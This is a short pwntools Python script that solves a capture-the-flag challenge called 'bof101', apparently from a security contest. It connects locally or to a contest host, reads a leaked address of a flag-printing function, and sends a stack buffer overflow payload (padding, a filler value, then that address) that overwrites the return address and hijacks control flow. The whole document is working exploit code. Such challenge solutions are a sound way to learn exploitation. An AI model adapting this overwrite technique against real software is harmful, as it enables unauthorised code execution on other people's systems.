from pwn import *

context.log_level = "debug"

LOCAL = True
if LOCAL:
    p = process("./bof101")
else:
    PORT = int(input("PORT: "))
    p = remote("bof101.sstf.site", PORT)


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


p.recvuntil("addr: ")
printflag_addr = int(p.recvn(8), 16)
p.recvuntil("What is your name?")

payload = b""
payload += 0x8C * b"A"
print(hex(0xDEADBEEF))
payload += p64(0xDEADBEEF)
payload += p64(printflag_addr)

p.sendline(payload)
